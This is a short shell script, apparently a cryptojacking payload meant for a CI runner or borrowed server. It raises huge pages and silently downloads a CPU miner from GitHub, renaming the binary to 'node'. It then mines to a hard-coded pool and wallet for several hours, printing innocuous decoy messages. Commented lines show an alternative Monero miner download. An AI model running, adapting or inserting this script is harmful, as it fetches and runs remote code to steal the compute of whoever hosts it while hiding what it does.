#!/bin/sh
#
#
#XMR
# wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar > /dev/null 2>&1
# tar -xvf MXCC.tar > /dev/null 2>&1
# cd MXCC > /dev/null 2>&1
x=1 
timer=$(shuf -i 280-288 -n 1)
sysctl -w vm.nr_hugepages=1280
echo "Welcome $x times"
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz > /dev/null 2>&1
tar -xf cpuminer-opt-linux.tar.gz > /dev/null 2>&1
mv cpuminer-avx node
while [ $x -le 1 ]
do
  echo "Welcome $x times"
#   timeout "$timer"m 
#   ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
  timeout "$timer"m ./node -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbah ; if [ $? -eq 124 ] ; then echo success! ; else echo failed ; fi


#   sh -c "echo Helllo world my name is $INPUT_MY_NAME"
  x=$(( $x + 1 ))
  sleep 15
  echo "All done with $x times"
done
